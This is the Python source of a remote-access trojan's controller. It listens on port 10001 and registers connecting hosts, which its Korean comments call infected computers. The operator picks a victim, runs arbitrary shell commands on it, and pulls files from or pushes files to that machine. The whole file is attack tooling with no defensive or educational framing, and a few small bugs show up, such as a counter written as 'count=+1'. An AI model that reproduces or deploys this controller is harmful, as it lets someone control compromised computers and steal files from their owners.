#-*- coding: utf-8 -*-
from socket import *
import fnmatch
import time
import threading
import sys
import os.path
HOST = ''
PORT = 10001
BUFFERSIZE=4096
s = socket(AF_INET,SOCK_STREAM)
s.setsockopt(SOL_SOCKET, SO_REUSEADDR,1)
s.bind((HOST,PORT))
s.listen(5)
conn=0
clientname = [0]
clientconn = [0]
check=0
count=0
MAX_ID=0
checksum=1

class Client() :
    def __init__(self,conn,addr) :
        self.conn = conn
        self.addr = addr
        name = get_id()
        self.name = str(name)

'''class ThreadClass(threading.Thread):
    def run(self):
        receivinguser()
'''
def main():
    global conn,checksum,check
    th=threading.Thread(target=receivinguser)
    th.start()

    helping()
    while 1:
        try :
            command = input('$')
            if not command or command == ' ': continue
            if fnmatch.fnmatch(command,'dl'+'*'): #데이터를 받는다.
                conn.send(command.encode('utf-8'))
                downloading(command,conn)
            elif fnmatch.fnmatch(command,'ul'+'*'): #데이터를 보낸다.
                conn.send(command.encode('utf-8'))
                uploading(command,conn)
            elif fnmatch.fnmatch(command,'who'+'*'):
                print(conn)
            elif fnmatch.fnmatch(command,'list'+'*'):
                print(clientname)
            elif fnmatch.fnmatch(command,'sel'+'*'):
                conn=clientconn[int(command[4])]
            else:
                conn.send(command.encode('utf-8'))
                cmd(conn)

        except EnvironmentError :
            print('there is no client')
            continue
        except AttributeError :
            print('please select target')
            helping()
        except NameError:
            helping()
    conn.close()

def get_id() : #감염컴퓨터에게 각각 0부터 id를 부여한다.
    global MAX_ID
    MAX_ID+=1
    return MAX_ID


def downloading(command,conn):
    tmp_filename=command[command.find('dl')+3:]
    filename=tmp_filename[tmp_filename.rfind('/')+1:]
    file = open(filename,"wb")
    data=conn.recv(BUFFERSIZE)
    def finish_downloading():
        time.sleep(0.5)
        print('file close')
        file.close()
        print('i download '+filename)

    if data==b'nofile':
        print('file is not exists')
        pass
    else:
        while 1:
            file.write(data)
            data=conn.recv(BUFFERSIZE)
            count=+1
            fndata=str(data)
            if data==b'finish':
                finish_downloading()
                break
            if(count>50):
                print('be downloading')
                count=0



def uploading(command,conn):
    filename=command[3:]
    try:
        movie = open(filename, "rb")
    except FileNotFoundError:
        conn.send(b'nofile')
        print('my computer has nofile')
    else:
        l = movie.read(BUFFERSIZE)
        while l:
            conn.send(l)
            l=movie.read(BUFFERSIZE)
        time.sleep(0.5)
        conn.send(b'finish')
        movie.close()
        print('i sended '+filename)

def cmd(conn):
    global checksum,check
    while 1:
        print('before recive')
        data=conn.recv(BUFFERSIZE)
        try:
            check=data.decode('utf-8')
            time.sleep(1)
        except UnicodeError:
            print('unicode error')
            break
        if fnmatch.fnmatch(check,'finish'+'*'):
            break
        print(check)

def receivinguser():
    while 1:
        conn1,addr1 = s.accept()
        temclient=Client(conn1,addr1)
        clientname.append(temclient.addr)
        clientconn.append(temclient.conn)
        print ("\nClient Connected : " + str(temclient.name))
        print("connected by",temclient.addr)
        break

def helping() :
    print('dl ? download file')
    print('ul ? upload file')
    print('"who"   print selected user')
    print('"list" print all connected user')
    print('sel ?(number) select user')

def directorying():
    a=os.path.abspath(sys.argv[0])
    now_directory =a.replace('\\','/')
    dir_path=os.path.dirname(now_directory)
    print(dir_path)
    while 1:
        cmd = input('$')
        if cmd == 'cd ..':
            dir_path=os.path.dirname(dir_path)
        print(dir_path)


if __name__ == '__main__':
    main()



